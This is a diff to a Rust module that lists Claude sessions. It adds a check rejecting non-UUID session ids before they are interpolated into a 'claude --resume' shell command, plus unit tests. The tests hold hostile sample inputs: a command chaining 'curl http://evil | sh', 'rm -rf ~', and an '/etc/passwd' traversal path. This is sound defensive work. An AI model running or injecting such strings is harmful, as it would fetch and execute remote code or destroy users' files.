@@ -260,6 +260,18 @@ fn parse_session_file(path: &Path) -> Option<ClaudeSessionInfo> {
 
     let session_id = session_id?;
 
+    // The id is later interpolated into `claude --resume <id>` and written to a
+    // shell PTY, so a transcript whose sessionId is not a UUID-shaped token
+    // (e.g. an attacker-planted file containing shell metacharacters) must never
+    // reach the resume picker.
+    if !is_safe_session_id(&session_id) {
+        log::warn!(
+            "Skipping Claude session with unsafe sessionId in {}",
+            path.display()
+        );
+        return None;
+    }
+
     // Get file modification time for last_active
     let metadata = fs::metadata(path).ok()?;
     let mtime = metadata.modified().ok().unwrap_or(SystemTime::UNIX_EPOCH);
@@ -352,6 +364,25 @@ pub async fn list_claude_sessions(project_path: String) -> Result<Vec<ClaudeSess
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // ---- is_safe_session_id (resume-injection guard) ---------------------
+
+    #[test]
+    fn rejects_session_ids_with_shell_metacharacters() {
+        // These would be interpolated into `claude --resume <id>` and written
+        // to a shell PTY, so anything non-UUID-shaped must be rejected.
+        assert!(!is_safe_session_id("x; curl http://evil | sh"));
+        assert!(!is_safe_session_id("a && rm -rf ~"));
+        assert!(!is_safe_session_id("../../etc/passwd"));
+        assert!(!is_safe_session_id("a b"));
+        assert!(!is_safe_session_id(""));
+    }
+
+    #[test]
+    fn accepts_uuid_shaped_session_ids() {
+        assert!(is_safe_session_id("01234567-89ab-cdef-0123-456789abcdef"));
+        assert!(is_safe_session_id("deadbeef"));
+    }
 
     // ---- encode_project_path ---------------------------------------------
 
